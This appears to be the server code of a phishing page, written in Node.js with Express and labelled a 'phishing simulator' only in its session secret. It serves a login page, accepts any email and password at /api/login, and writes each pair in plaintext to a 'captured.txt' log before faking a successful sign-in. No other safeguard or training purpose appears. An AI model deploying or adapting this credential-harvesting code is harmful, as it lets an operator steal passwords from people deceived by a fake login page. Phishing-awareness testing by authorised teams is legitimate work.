const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(session({
    secret: 'secret-key-for-phishing-simulator',
    resave: false,
    saveUninitialized: false,
    cookie: { 
        secure: false,        
        maxAge: 1000 * 60 * 60 
    }
}));

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static('public'));

const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir);
}

app.get('/', (req, res) => {
    res.redirect('/login.html');
});

app.post('/api/login', (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email and password required' });
    }

    const logEntry = `
Time: ${new Date().toISOString()}
Email: ${email}
Password: ${password}
---------------------------
`;
    fs.appendFileSync(path.join(logsDir, 'captured.txt'), logEntry);

    req.session.email = email;

    res.json({ success: true, email });
});

app.get('/api/user', (req, res) => {
    if (req.session.email) {
        res.json({ email: req.session.email });
    } else {
        res.status(401).json({ error: 'unauthorized' });
    }
});

app.get('/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) {
            console.error('Error: ', err);
        }
        res.redirect('/login.html');
    });
});

app.get('/profile.html', (req, res, next) => {
    if (!req.session.email) {
        return res.redirect('/login.html');
    }
    next();
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});